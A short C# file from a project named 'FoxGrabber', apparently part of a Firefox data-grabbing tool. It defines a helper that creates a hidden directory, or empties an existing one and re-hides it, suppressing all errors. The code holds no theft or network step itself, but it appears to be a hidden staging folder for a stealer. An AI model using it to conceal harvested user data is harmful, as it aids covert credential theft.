namespace FoxGrabber
{
    using System;
    using System.IO;

    public class HomeDirectory
    {
        public static void Create(string HomeDir, bool Recursive)
        {
            var DirHome = new DirectoryInfo(HomeDir);
            if (!DirHome.Exists)
            {
                try
                {
                    DirHome.Create();
                    DirHome.Refresh();
                    DirHome.Attributes |= FileAttributes.Hidden;
                }
                catch (IOException) { }
            }
            else
            {
                foreach (FileInfo FileHome in DirHome.GetFiles())
                {
                    try
                    {
                        FileHome.Delete();
                    }
                    catch (IOException) { }
                    catch (UnauthorizedAccessException) { }
                }

                foreach (DirectoryInfo SubHome in DirHome.GetDirectories())
                {
                    try
                    {
                        SubHome.Delete(Recursive);
                    }
                    catch (IOException) { }
                    catch (UnauthorizedAccessException) { }
                }
                DirHome.Attributes |= FileAttributes.Hidden;
            }
        }
    }
}